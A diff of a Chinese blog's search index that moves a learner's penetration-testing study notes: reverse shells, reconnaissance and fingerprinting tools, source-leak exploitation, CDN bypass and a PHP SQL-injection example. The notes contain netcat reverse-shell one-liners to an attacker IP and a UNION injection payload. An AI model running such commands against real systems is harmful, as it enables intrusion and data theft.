+<p>2、数据库文章数据导入-MySQL工操作<br>首先配置数据库连接–验证数据库配置–定义数据查询到的变量并赋值–连接具体表–执行具体字段显示</p>
+<p>每次查询数据时都需要执行核查数据库配置的语句所以可以把数据库连接配置写成配置文件</p>
+<p>3、PHP操作MYSQL编写-PHP变量提交<br>要实现提交一个参数传到数据库中查询，需要先通过GET获取提交的参数，然后通过数据库语法（where id &#x3D; ?）指定查询内容(此处因为没有对传入的参数进行限制就导致了sql注入，例如where id&#x3D;1 union select name from admin)</p>
+<p>除了使用GET传参外，还可以使用PSOT和REQUEST传参，这样就是sql注入中的get方式和post方式注入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">组件：</span><br><span class="line">Navicat:操作数据库</span><br><span class="line">Dreamweaver:前端页面设计</span><br><span class="line">PhpStorm:PHP开发IDE</span><br><span class="line">phpStudy:PHP搭建环境</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>python学习经历-2-flask</title>
     <url>/2023/11/13/python%E5%AD%A6%E4%B9%A0%E7%BB%8F%E5%8E%86-2-flask/</url>
     <content><![CDATA[<p>接着之前的python进行学习，决定还是从更加实用点的项目相关的知识去学习，这样也可以去更好的实践当中去锻炼自己的能力，所以就选择了flask这个python中的轻量模块去学习。</p>
@@ -1491,167 +1652,6 @@
       </categories>
       <tags>
         <tag>blog</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>渗透测试学习之路</title>
-    <url>/2023/11/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/</url>
-    <content><![CDATA[<p>已经决定了准备暑假看看去找个实习，对于web手来说，渗透肯定是必不可少的，所以从现在开始，也要抓紧时间去好好学下渗透的相关知识了。</p>
-<span id="more"></span>
-
-<h1 id="1、第1天：基础入门-操作系统-名词-文件下载-反弹SHELL-防火墙绕过"><a href="#1、第1天：基础入门-操作系统-名词-文件下载-反弹SHELL-防火墙绕过" class="headerlink" title="1、第1天：基础入门-操作系统&amp;名词&amp;文件下载&amp;反弹SHELL&amp;防火墙绕过"></a>1、第1天：基础入门-操作系统&amp;名词&amp;文件下载&amp;反弹SHELL&amp;防火墙绕过</h1><blockquote>
-<p>一些参考的资料工具网站</p>
-<p>渗透常见术语<a href="https://www.cnblogs.com/sunny11/p/13583083.html">https://www.cnblogs.com/sunny11/p/13583083.html</a></p>
-<p>渗透中下载：<a href="https://forum.ywhack.com/bountytips.php?download">https://forum.ywhack.com/bountytips.php?download</a></p>
-<p>反弹shell：<a href="https://forum.ywhack.com/reverse-shell/">https://forum.ywhack.com/reverse-shell/</a></p>
-<p>常见命令：<a href="https://blog.csdn.net/weixin_43303273/article/details/83029138">https://blog.csdn.net/weixin_43303273/article/details/83029138</a></p>
-</blockquote>
-<h2 id="1、内网与外网的区别"><a href="#1、内网与外网的区别" class="headerlink" title="1、内网与外网的区别"></a>1、内网与外网的区别</h2><p>外网就是正常我们使用的服务器那种的，我们可以直接通过ip地址去访问，而内网则是在一小范围中使用的，无法直接通过其ip地址去直接找到，这个时候我们只能通过建立通道或者端口指定从而去指定到我们需要访问的内网，就比如虚拟机的ip，就相当于一个内网地址。</p>
-<h2 id="2、出网和进网"><a href="#2、出网和进网" class="headerlink" title="2、出网和进网"></a>2、出网和进网</h2><p>Windows的防火墙对于出网限制很少，而对于进网则有着很大的限制。</p>
-<p>所以在一般情况下，我们使用带有防火墙的主机去将cmd权限发出，使用没有防火墙的主机去连接，防火墙这样就不会起到阻拦的作用了。</p>
-<h2 id="3、反弹shell"><a href="#3、反弹shell" class="headerlink" title="3、反弹shell"></a>3、反弹shell</h2><blockquote>
-<p>Windows：nc -e cmd ip port</p>
-<p>Linux:   nc -e &#x2F;bin&#x2F;bash ip port</p>
-</blockquote>
-<p>内网可以连接外网，外网无法去连接内网。</p>
-<h2 id="4、实战"><a href="#4、实战" class="headerlink" title="4、实战"></a>4、实战</h2><p>①将cmd上传至目标服务器</p>
-<p>②将cmd权限发出，并使用外网主机接受</p>
-<p>③拿到权限，从而去完成渗透</p>
-<h1 id="2、第2天：基础入门-Web应用-架构搭建-漏洞-HTTP数据包-代理服务器"><a href="#2、第2天：基础入门-Web应用-架构搭建-漏洞-HTTP数据包-代理服务器" class="headerlink" title="2、第2天：基础入门-Web应用&amp;架构搭建&amp;漏洞&amp;HTTP数据包&amp;代理服务器"></a>2、第2天：基础入门-Web应用&amp;架构搭建&amp;漏洞&amp;HTTP数据包&amp;代理服务器</h1><h2 id="1、网站的开发"><a href="#1、网站的开发" class="headerlink" title="1、网站的开发"></a>1、网站的开发</h2><p>这里也就是一些基础的web知识了，学会去购买服务器，域名等，并且以此去搭建一个自己的博客项目，这样也能去更好的理解一下网站的结构等相关知识。在这里就不过多的去讲解了，这都可以自己跟着网上的资料去学习的。</p>
-<h2 id="2、web应用框架"><a href="#2、web应用框架" class="headerlink" title="2、web应用框架"></a>2、web应用框架</h2><p>理解不同WEB应用组成角色功能架构：</p>
-<p>开发语言，程序源码，中间件容器，数据库类型，服务器操作系统，第三方软件等。</p>
-<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-29/e0c18ac5a06e048e519805fbc591a642--032f--image-20231129155607968.png" alt="image-20231129155607968"></p>
-<h2 id="3、代理以及抓包"><a href="#3、代理以及抓包" class="headerlink" title="3、代理以及抓包"></a>3、代理以及抓包</h2><p>可以使用bp去实现抓到请求包，并且去修改从而达到我们想要的效果。</p>
-<p>然后就是可以根据响应包的状态码去判断状态。</p>
-<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-29/f9ff913739a0803b75f280912eff5134--c28f--image-20231129155736090.png" alt="image-20231129155736090"></p>
-<h2 id="4、代理购买的作用"><a href="#4、代理购买的作用" class="headerlink" title="4、代理购买的作用"></a>4、代理购买的作用</h2><p>在网上去购买代理，就可以实现每次点击网站使用的就是不同的ip地址，这样就能去防止自身的ip被拉入黑名单后无法访问的问题。购买代理就像是在主机和被访问服务器之间新增了一个代理服务器，由这个服务器把你的请求拦截并由它发出，最后接收到的返回包也由它经手返回</p>
-<h1 id="第3天：基础入门-抓包-封包-协议-APP-小程序-PC应-WEB应用"><a href="#第3天：基础入门-抓包-封包-协议-APP-小程序-PC应-WEB应用" class="headerlink" title="第3天：基础入门-抓包&amp;封包&amp;协议&amp;APP&amp;小程序&amp;PC应&amp;WEB应用"></a>第3天：基础入门-抓包&amp;封包&amp;协议&amp;APP&amp;小程序&amp;PC应&amp;WEB应用</h1><h2 id="1、重点总结"><a href="#1、重点总结" class="headerlink" title="1、重点总结"></a>1、重点总结</h2><p>①为什么要抓包？ -抓包应用的资产信息进行安全测试</p>
-<p>②抓包的对象有哪些？ -小程序，APP，桌面应用等</p>
-<p>③抓包协议区别工具？ -有部分应用不走HTTP&#x2F;S，需要用到全局协议抓包</p>
-<p>④封包和抓包不同之处？  -零散整体的区别，封包能精确到每一个操作的数据包。</p>
-<h2 id="2、手机APP、小程序的抓包"><a href="#2、手机APP、小程序的抓包" class="headerlink" title="2、手机APP、小程序的抓包"></a>2、手机APP、小程序的抓包</h2><p>使用bp，Charles去抓包，小程序的话不方便使用bp，使用Charles更加方便。</p>
-<p>bp抓包能够精准定位到每一次数据包的发送。</p>
-<h2 id="3、全局协议抓包"><a href="#3、全局协议抓包" class="headerlink" title="3、全局协议抓包"></a>3、全局协议抓包</h2><p>可以去使用科来或者wireshark去抓包，直接对全局进行抓包，并不只局限于HTTP数据包，可以更方便的用于对一些应用的抓包。</p>
-<h2 id="4、封包"><a href="#4、封包" class="headerlink" title="4、封包"></a>4、封包</h2><p>这里就可以去使用一个封包监听工具，可以去监听某个进程的数据包并且进行封包，封包的话就是可以将某种行为包装成一个数据包，我们就可以重新去发送这个数据包去重复某种行为，更加精确。这就很方便于对于游戏外挂相关的制作。</p>
-<h1 id="第4天：基础入门-30余种加密编码进制-Web-数据库-系统-代码-参数值"><a href="#第4天：基础入门-30余种加密编码进制-Web-数据库-系统-代码-参数值" class="headerlink" title="第4天：基础入门-30余种加密编码进制&amp;Web&amp;数据库&amp;系统&amp;代码&amp;参数值"></a>第4天：基础入门-30余种加密编码进制&amp;Web&amp;数据库&amp;系统&amp;代码&amp;参数值</h1><p>今天讲的这个就是属于很基础的一部分了，都是相关加密解密的，作为一个ctf选手这方面了解的也算挺多的，所以也就不过多去讲解了。</p>
-<h2 id="1、文件加密"><a href="#1、文件加密" class="headerlink" title="1、文件加密"></a>1、文件加密</h2><p>通过各种语言自身的加密方式，对源代码进行加密，从而达到数据保护的功能。</p>
-<p>dll加密、php加密、SQL加密、jar加密</p>
-<h2 id="2、对编码的观察"><a href="#2、对编码的观察" class="headerlink" title="2、对编码的观察"></a>2、对编码的观察</h2><p>需要去熟悉一些加解密的相应特征，并且要求能够在碰见一些加密后的数据后能够去判断出加密方法并且对之进行解密。</p>
-<h1 id="第5天：基础入门-资产架构-端口-应用-CDN-WAF-站库分离-负载均衡"><a href="#第5天：基础入门-资产架构-端口-应用-CDN-WAF-站库分离-负载均衡" class="headerlink" title="第5天：基础入门-资产架构&amp;端口&amp;应用&amp;CDN&amp;WAF&amp;站库分离&amp;负载均衡"></a>第5天：基础入门-资产架构&amp;端口&amp;应用&amp;CDN&amp;WAF&amp;站库分离&amp;负载均衡</h1><h2 id="1、CDN和负载均衡"><a href="#1、CDN和负载均衡" class="headerlink" title="1、CDN和负载均衡"></a>1、CDN和负载均衡</h2><p>CDN是购买结点，从而去达到工具服务器的作用，从而可以加速访问国外网站的作用，并且可以在被攻打时无法找到真正的网站服务器。</p>
-<p>负载均衡时自身使用多台服务器，在访问的时候去随机访问一台服务器，从而也能起到防止渗透的作用。</p>
-<h2 id="2、web安全问题"><a href="#2、web安全问题" class="headerlink" title="2、web安全问题"></a>2、web安全问题</h2><p>目录站点</p>
-<p>端口站点</p>
-<p>ip站点</p>
-<p>服务器站点</p>
-<p>站点插件</p>
-<h2 id="3、番外安全问题"><a href="#3、番外安全问题" class="headerlink" title="3、番外安全问题"></a>3、番外安全问题</h2><p>域名注册商</p>
-<p>服务器厂商</p>
-<p>管理人员安全</p>
-<h2 id="4、一些阻碍"><a href="#4、一些阻碍" class="headerlink" title="4、一些阻碍"></a>4、一些阻碍</h2><p>站库分离</p>
-<p>CDN加速服务</p>
-<p>负载均衡服务</p>
-<p>WAF应用防火墙</p>
-<p>主机防护防火墙</p>
-<h1 id="第6天：信息打点-Web架构篇-域名-语言-中间件-数据库-系统-源码获取"><a href="#第6天：信息打点-Web架构篇-域名-语言-中间件-数据库-系统-源码获取" class="headerlink" title="第6天：信息打点-Web架构篇&amp;域名&amp;语言&amp;中间件&amp;数据库&amp;系统&amp;源码获取"></a>第6天：信息打点-Web架构篇&amp;域名&amp;语言&amp;中间件&amp;数据库&amp;系统&amp;源码获取</h1><p>知识点：</p>
-<p>1、打点-Web架构-语言&amp;中间件&amp;数据库&amp;系统等</p>
-<p>2、打点-Web源码-CMS开源&amp;闭源售卖&amp;自主研发等</p>
-<p>3、打点-Web源码获取-泄露安全&amp;资源监控&amp;其他</p>
-<p>4、打点-Web域名-子域名&amp;反查域名&amp;旁注等</p>
-<p>信息点：</p>
-<p>基础信息，系统信息，应用信息，防护信息，人员信息，其他信息等</p>
-<p>技术点：</p>
-<p>CMS识别，端口扫描，CDN绕过，源码获取，子域名查询，WAF识别，负载均衡识别等</p>
-<h1 id="第7天：信息打点-资产泄漏-CMS识别-Git监控-SVN-DS-Store-备份"><a href="#第7天：信息打点-资产泄漏-CMS识别-Git监控-SVN-DS-Store-备份" class="headerlink" title="第7天：信息打点-资产泄漏&amp;CMS识别&amp;Git监控&amp;SVN&amp;DS_Store&amp;备份"></a>第7天：信息打点-资产泄漏&amp;CMS识别&amp;Git监控&amp;SVN&amp;DS_Store&amp;备份</h1><p>知识点：<br>1、CMS指纹识别源码获取方式<br>2、习惯&amp;配置&amp;特性等获取方式<br>3、托管资产平台资源搜索监控</p>
-<p>详细点：<br>参考：<a href="https://www.secpulse.com/archives/124398.html">https://www.secpulse.com/archives/124398.html</a><br>源码泄漏原因：<br>1、从源码本身的特性入口<br>2、从管理员不好的习惯入口<br>3、从管理员不好的配置入口<br>4、从管理员不好的意识入口<br>5、从管理员资源信息搜集入口</p>
-<p>源码泄漏集合：<br>composer.]son<br>git源码泄露<br>svn源码泄露<br>hg源码泄漏<br>网站备份压缩文件<br>WEB-INF&#x2F;web.m1泄露<br>DS Store文件泄露<br>SWP文件泄露<br>CVS泄露<br>Bzr泄露<br>GitHub源码泄漏</p>
-<p>演示案例：<br>直接获取-CMS识别-云悉指纹识别平台<br>（yunsee.cn 在线指纹识别平台）<br>习惯不好备份文件-某黑阔博客源码泄漏<br>（网站管理员将网站备份到网站目录下造成源码泄露）<br>配置不当-GIT泄漏某程序员博客源码泄漏<br>参考链接：<a href="https://codeleading.com/article/54926468941/">https://codeleading.com/article/54926468941/</a><br>利用工具：<a href="https://github/lijiejie/GitHack">https://github/lijiejie/GitHack</a></p>
-<p>当在一个空目录执行 git init 时，Git 会创建一个 .git 目录。 这个目录包含所有的 Git 存储和操作的对象。 如果想备份或复制一个版本库，只需把这个目录拷贝至另一处就可以了<br>比如某个网站存在.git文件泄露，可以：<br>利用方式：<br>github上的githack可以把整个.git备份的文件下载下来。它能解析 .git&#x2F;index 文件，并找到工程中所有的：文件名和文件 sha1，然后去 .git&#x2F;objects&#x2F; 文件夹下下载对应的文件，通过 zlib 解压文件，按原始的目录结构写入源代码<br>配置不当-SVN泄漏-某国外小伙子源码泄漏<br>SVN 是 Subversion 的简称，是一个开放源代码的版本控制系统，相较于 RCS、CVS，它采用了分支管理系统，它的设计目标就是取代 CVS。互联网上很多版本控制服务已从 CVS 迁移到 Subversion。<br>很多网站都使用了 svn 版本控制系统，和使用 git 版本控制器类似，很多开发者网站安全意识不足，代码放到生产坏境中后，没有清理 svn 的一些信息，导致 svn 残留，因此攻击者可以使用工具 dvcs-ripper 下载网站源码。<br>当可以访问到&#x2F;.svn&#x2F;entries的时候，就证明存在了。<br>比如乌云曾经爆出的某个网站：</p>
-<p><a href="http://data.5i5j.com/sitemetrics/.svn/entries">http://data.5i5j.com/sitemetrics/.svn/entries</a><br>利用工具 <a href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a><br>工具命令 rip-svn.pl -v -u <a href="http://www.localhost.test/.svn/">http://www.localhost.test/.svn/</a></p>
-<p>配置不当-DS Store泄漏-某开发Mac源码泄漏<br>.DS_Store 文件 MAC 系统是用来存储这个文件夹的显示属性的：比如文件图标的摆放位置。如果用户删除以后的副作用就是这些信息的失去。</p>
-<p>这些文件本来是给 Finder 使用的，但它们被设想作为一种更通用的有关显示设置的元数据存储，诸如图标位置和视图设置。 当你需要把代码上传的时候，安全正确的操作应该把 .DS_Store 文件删除才正确。通过.DS_Store可以知道这个目录里所有的文件名称。</p>
-<p>当访问&#x2F;.ds_store可以访问的到，就证明存在。例如：</p>
-<p><a href="http://www.baidu.com/.ds_store">http://www.baidu.com/.ds_store</a></p>
-<p>工具:<a href="https://github.com/lijiejie/ds_store_exp">https://github.com/lijiejie/ds_store_exp</a></p>
-<p>使用方式：</p>
-<p>python ds_store_exp.py <a href="http://www.example.com/.DS_Store">http://www.example.com/.DS_Store</a></p>
-<p>PHP特性-composer.json泄漏-某直接搭建源码泄漏</p>
-<p>例如：<a href="http://57.128.195.180/composer.json">http://57.128.195.180/composer.json</a></p>
-<blockquote>
-<p>下载配合-WEB-INF泄露-RoarCTF-2019-EasyJava</p>
-<p>解题思路：访问靶场通过控制filename来任意文件下载</p>
-<p>因为WEB-INF会存储配置文件，所以构造filename&#x3D;WEB-INF&#x2F;web.xml,此文件会记录源码的结构</p>
-<p>访问文件内容，并构造文件名下载</p>
-<p>最后通过反编译出flag</p>
-</blockquote>
-<blockquote>
-<p>资源监控-GITHUB泄漏-语法搜索&amp;关键字搜索&amp;社工<br>通过github和google hack语法搜索相关信息<br>相关利用项目：</p>
-<p>cMs识别：<a href="https://www.yunsee.cn/">https://www.yunsee.cn/</a> 备份：敏感目录文件扫描 -7 kbscan-WebPathBrute<br>CVS:<a href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a><br>GIT:<a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a><br>SVN:<a href="https://github.com/callmefeifei/SvnHack_DS">https://github.com/callmefeifei/SvnHack_DS</a><br>Store:<a href="https://github.com/lijiejie/ds_stor_exp">https://github.com/lijiejie/ds_stor_exp</a></p>
-</blockquote>
-<blockquote>
-<p>GITHUB资源搜索：<br>in:name test #仓库标题搜索含有关键字<br>in:descripton test #仓库描述搜索含有关键字<br>in:readme test #Readme文件搜素含有关键字<br>stars:&gt;3000 test #stars数量大于3000的搜索关键字</p>
-</blockquote>
-<h1 id="第8天-信息打点-系统篇-端口扫描-CDN服务-负载均衡-WAF防火墙"><a href="#第8天-信息打点-系统篇-端口扫描-CDN服务-负载均衡-WAF防火墙" class="headerlink" title="第8天 信息打点-系统篇&amp;端口扫描&amp;CDN服务&amp;负载均衡&amp;WAF防火墙"></a>第8天 信息打点-系统篇&amp;端口扫描&amp;CDN服务&amp;负载均衡&amp;WAF防火墙</h1><p>知识点：<br>1、获取网络信息-服务厂商&amp;网络架构<br>2、获取服务信息-应用协议&amp;内网资产<br>3、获取阻碍信息-CDN&amp;WAF&amp;负载&amp;防火墙</p>
-<p>详细点：<br>CDN服务，WAF防火墙，负载均衡，防火墙阻碍？</p>
-<p>演示案例：<br>网络信息获取-服务厂商&amp;网络架构<br>通过域名信息查询获取 IP、云服务厂商、域名出售厂商、注册者邮箱等信息（可以使用威胁情报平台）</p>
-<p>服务信息获取-协议应用&amp;内网资产<br>旁注：查询同一服务器下的不同WEB应用<br>C段：查询同一网段下，不同服务器部署的不同WEB应用<br>nmap target -Pn -osscan-limit -sV</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-Pn：不检测主机存活 -osscan-limit:扫操作系统 </span><br><span class="line"></span><br><span class="line">-sV：探测打开的端口以确定服务/版本信息</span><br></pre></td></tr></table></figure>
-
-<p>阻碍信息获取-CDN&amp;WAF&amp;负载&amp;防火墙<br>超级ping:CDN服务识别（全国个地去ping目标地址，看访问的IP地址是否不同）<br>wafw00f识别waf、看图识别</p>
-<p>ldb识别负载均衡</p>
-<p>#相关利用项目：<br>Masscan:<a href="https://github.com/robertdavidgraham/masscan">https://github.com/robertdavidgraham/masscan</a><br>Wafwoof:<a href="https://github.com/Enablesecurity/wafw00f">https://github.com/Enablesecurity/wafw00f</a><br>Kali上自带Nmap,Masscan,lbd等项目，超级ping:ping.chinaz.com<br>超级ping:CDN服务识别<br>Masscan:端口扫描，应用协议<br>Wafw00f:Web应用防护防火墙识别<br>namp：端口扫描，应用协议，防火墙识别<br>lbd:负载均衡，广域网负载均衡，应用层负载均衡</p>
-<h1 id="第9天-信息打点-CDN烧过篇-漏洞回链8接口探针-全网扫指-反向件"><a href="#第9天-信息打点-CDN烧过篇-漏洞回链8接口探针-全网扫指-反向件" class="headerlink" title="第9天 信息打点-CDN烧过篇&amp;漏洞回链8接口探针&amp;全网扫指&amp;反向件"></a>第9天 信息打点-CDN烧过篇&amp;漏洞回链8接口探针&amp;全网扫指&amp;反向件</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">知识点：</span><br><span class="line">1、CDN知识-工作原理及阻碍</span><br><span class="line">2、CDN配置-域名&amp;区域&amp;类型</span><br><span class="line">3、CDN绕过-靠谱十余种技战法</span><br><span class="line">4、CDN绑定-HOSTS绑定指向访问</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>CDN 是构建在数据网络上的一种分布式的内容分发网。 CDN的作用是采用流媒体服务器集群技术，克服单机系统输出带宽及并发能力不足的缺点，可极大提升系统支持的并发流数目，减少或避免单点失效带来的不良影响。</p>
-</blockquote>
-<p>#前置知识<br>1.传统访问：用户访问域名-&gt;解析服务器IP-&gt;访问目标主机<br>2.普通CDN:用户访问域名-&gt;CDN节点-&gt;真实服务器IP-&gt;访问目标主机<br>3.带WAF的CDN:用户访问域名-&gt;CDN节点(WAF)-&gt;真实服务器IP-&gt;访问目标主机</p>
-<p>CDN的使用:在阿里云平台上去进行按每一步配置即可。</p>
-<p>#判定标准：<br>nslookup,各地ping(出现多个IP即启用CDN服务)<br>#参考知识：<br><a href="https://zhuanlan.zhihu.com/p/33440472">https://zhuanlan.zhihu.com/p/33440472</a><br><a href="https://www.cnblogs.com/blacksunny/p/5771827.html">https://www.cnblogs.com/blacksunny/p/5771827.html</a><br>子域名，去掉www,邮件服务器，国外访问，证书查询，APP抓包<br>黑暗空间引擎（yofo），通过漏洞或泄露获取，扫全网，以量打量，第三方接口查询等</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">演示案例：</span><br><span class="line">真实应用-CDN绕过-漏洞&amp;遗留文件</span><br><span class="line">原理： 利用ssrf使得服务器主动请求VPS地址，此时通过在VPS地址监听请求即可得知真实地址。（相当于目标服务器主动请求VPS地址，vps会监听到真实地址）</span><br><span class="line"></span><br><span class="line">真实应用-CDN绕过-子域名查询操作</span><br><span class="line">原理：配置CDN时管理员考虑费用问题可能会将子域名排除在外，此时通过手机子域名信息即可得到真实地址（用于子域名应用和根域名应用部署在同一服务器的情况下）</span><br><span class="line"></span><br><span class="line">真实应用-CDN绕过-接口查询国外访问</span><br><span class="line">原理：配置CDN时选择地域可能会仅设置成国内生效，此时使用国外地址访问获得真实地址</span><br><span class="line"></span><br><span class="line">真实应用-CDN绕过-主动邮件配合备案</span><br><span class="line">原理:通过系统功能（如：密码找回发送邮件，查看邮件发送方地址找寻），通过备案信息确认，一般是通过备案的地点去判定</span><br><span class="line"></span><br><span class="line">真实应用-CDN绕过-全网扫描FuckCDN</span><br><span class="line">原理：扫描全球ip匹配web内容，实用工具匹配扫描网段title信息。需要大量时间很多情况下，不过也是最稳定的方法。</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#参考知识：</span><br><span class="line">https://zhuanlan.zhihu.com/p/33440472</span><br><span class="line">https://www.cnblogs.com/blacksunny/p/5771827.html</span><br><span class="line">子域名，去掉www,邮件服务器，国外访问，证书查询，APP抓包</span><br><span class="line">黑暗空间引擎，通过漏洞或泄露获取，扫全网，以量打量，第三方接口查询等</span><br><span class="line">#案例资源：</span><br><span class="line">超级Ping:https://www.17ce.com/</span><br><span class="line">接口查询：https://get-site-ip.com/</span><br><span class="line">国外请求：https://tools.ipip.net/cdn.php</span><br><span class="line">全网扫描：https://github.com/Tai7sy/fuckcdn</span><br></pre></td></tr></table></figure>
-
-<h1 id="第10天-信息打点-APP-小程序篇-抓包封包-XP框架-反编译-资产提取"><a href="#第10天-信息打点-APP-小程序篇-抓包封包-XP框架-反编译-资产提取" class="headerlink" title="第10天 信息打点-APP&amp;小程序篇&amp;抓包封包&amp;XP框架&amp;反编译&amp;资产提取"></a>第10天 信息打点-APP&amp;小程序篇&amp;抓包封包&amp;XP框架&amp;反编译&amp;资产提取</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#### 知识点：</span><br><span class="line"></span><br><span class="line">1、小程序-外在-资产收集</span><br><span class="line">2、APP-外在&amp;内在-资产收集</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#### 演示案例：</span><br><span class="line"></span><br><span class="line">APP-外在抓包-Fd&amp;茶杯&amp;Burp</span><br><span class="line"></span><br><span class="line">APP-外在封包-封包监听工具</span><br><span class="line">使用封包监听也可抓到数据包</span><br></pre></td></tr></table></figure>
-
-<p>APP-内在提取-ApplnfoScanner</p>
-<blockquote>
-<p>一款适用于以HW行动&#x2F;红队&#x2F;渗透测试团队为场景的移动端(Android、iOS、WEB、H5、静态网站)信息收集扫描工具，可以帮助渗透测试工程师、攻击队成员、红队成员快速收集到移动端或者静态WEB站点中关键的资产信息并提供基本的信息输出,如：Title、Domain、CDN、指纹信息、状态信息等。</p>
-</blockquote>
-<p>APP-内在搜索-反编译载入IDEA</p>
-<ul>
-<li>APP-资源提取-安装泡&amp;资源文件<br>使用安卓修改大师导入apk文件，可对域名资源进行收集</li>
-</ul>
-<p>​	还可使用IDEA对反编译出的项目进行资源收集</p>
-<ul>
-<li>APP-框架使用-Xposed&amp;JustTrustMe</li>
-</ul>
-<p>某些apk存在加壳的情况，会扫描失败，可以通过工具判断apk是否加壳</p>
-<p>可通过安装xp框架的方式进行脱壳处理</p>
-<p>小程序-微信-电脑版登录启动抓包分析</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">APP安卓入手</span><br><span class="line">1、外在-抓包封包-资产安全测试</span><br><span class="line">资产收集-资源提取-ICO,MD5,HASH-黑暗引擎搜索相关资产</span><br><span class="line">2、外在-功能逻辑</span><br><span class="line">3、内在-反编译-JAVA代码代码审计</span><br><span class="line">4、内在-反编译-提取RES资源-黑暗资产收集</span><br></pre></td></tr></table></figure>
-
-<h1 id="第11天信息打点-红队工具篇-Fofa-Quake-Kunyu-Suize水泽-Ar灯塔"><a href="#第11天信息打点-红队工具篇-Fofa-Quake-Kunyu-Suize水泽-Ar灯塔" class="headerlink" title="第11天信息打点-红队工具篇&amp;Fofa&amp;Quake&amp;Kunyu&amp;Suize水泽&amp;Ar灯塔"></a>第11天信息打点-红队工具篇&amp;Fofa&amp;Quake&amp;Kunyu&amp;Suize水泽&amp;Ar灯塔</h1><p>知识点：<br>1、网络空间四大引擎-Fofa&amp;Quake&amp;shodan&amp;2 oomeye I<br>2、自动化信息收集项目-ARL灯塔&amp;Suize水泽s Kunyui坤舆<br>3、单点功能信息收集项目-企查：子域名指纹识别：社工信息</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">##黑暗引擎：</span><br><span class="line">https://fofa.so</span><br><span class="line">https://quake.360.cn</span><br><span class="line">https://www.shodan.io</span><br><span class="line">https://www.zoomeye.org</span><br><span class="line">##自动项目：</span><br><span class="line">https://github.com/knownsec/Kunyu</span><br><span class="line">https://github.com/0x727/shuize 0x727</span><br><span class="line">https://github.com/TophantTechnology/ARL</span><br><span class="line">##相关资源：</span><br><span class="line">https://forum.ywhack.com/center.php</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、演示案例：网络空间-Fofa&amp;Quake&amp;Shodan&amp;Zoomeye</span><br><span class="line">工具测评网络空间四大黑暗彩擎集合版项目</span><br><span class="line">finger:通过调用zoomeyes和fofa的接口实现</span><br><span class="line">	通过fofa和zoomeyes两个接口去进行信息搜集</span><br><span class="line">2工具测评-自动化收集-ARL灯塔&amp;Suize水泽&amp;Kunyu</span><br><span class="line">Kunyu：通过调用zoomeyes API实现资产信息和漏洞信息收集 还能够通过一个api去进行相关漏洞的搜集</span><br><span class="line">ARL灯塔：自动化信息收集工具</span><br><span class="line">水泽Suize：认为是暂时最好用的一个工具，能够搜集到更加全面的信息。</span><br><span class="line">3、工具测评-单点功能器企查查&amp;子域名&amp;指纹识别&amp;社工</span><br><span class="line">相比自动化全部搜集的工具，所能搜集到的信息更加准确，但都是同一个方面的。</span><br><span class="line">上述工具都可以在菱角社区去找到。</span><br></pre></td></tr></table></figure>
-
-<h1 id="第12天：PHP开发-个人博客项目-文章功能显示-数据库操作-数据接受"><a href="#第12天：PHP开发-个人博客项目-文章功能显示-数据库操作-数据接受" class="headerlink" title="第12天：PHP开发-个人博客项目_文章功能显示_数据库操作_数据接受"></a>第12天：PHP开发-个人博客项目_文章功能显示_数据库操作_数据接受</h1><p>首先ctf中注意的是php中的单双引号的区别，单引号不解析变量，双引号能够解析变量</p>
-<p>知识点：<br>1、PHP入门-语法&amp;提交等<br>2、MsQL入门-数据库操作<br>3、HTML+CS5入门-样式编排</p>
-<p>演示案例：<br>小迪博客文章阅读功能初步实现</p>
-<p>实现功能：<br>前端文章导航，点入内容显示，更改I♪显示不同内容<br>实现步骤：<br>1、前端页面显示编写-HTML&amp;CSS<br>HTML 是一种用于创建网页的标记语言，全称为超文本标记语言。使用html构造显示前端文章导航站点。</p>
-<p>2、数据库文章数据导入-MySQL工操作<br>首先配置数据库连接–验证数据库配置–定义数据查询到的变量并赋值–连接具体表–执行具体字段显示</p>
-<p>每次查询数据时都需要执行核查数据库配置的语句所以可以把数据库连接配置写成配置文件</p>
-<p>3、PHP操作MYSQL编写-PHP变量提交<br>要实现提交一个参数传到数据库中查询，需要先通过GET获取提交的参数，然后通过数据库语法（where id &#x3D; ?）指定查询内容(此处因为没有对传入的参数进行限制就导致了sql注入，例如where id&#x3D;1 union select name from admin)</p>
-<p>除了使用GET传参外，还可以使用PSOT和REQUEST传参，这样就是sql注入中的get方式和post方式注入</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">组件：</span><br><span class="line">Navicat:操作数据库</span><br><span class="line">Dreamweaver:前端页面设计</span><br><span class="line">PhpStorm:PHP开发IDE</span><br><span class="line">phpStudy:PHP搭建环境</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>渗透</tag>
       </tags>
   </entry>
 </search>
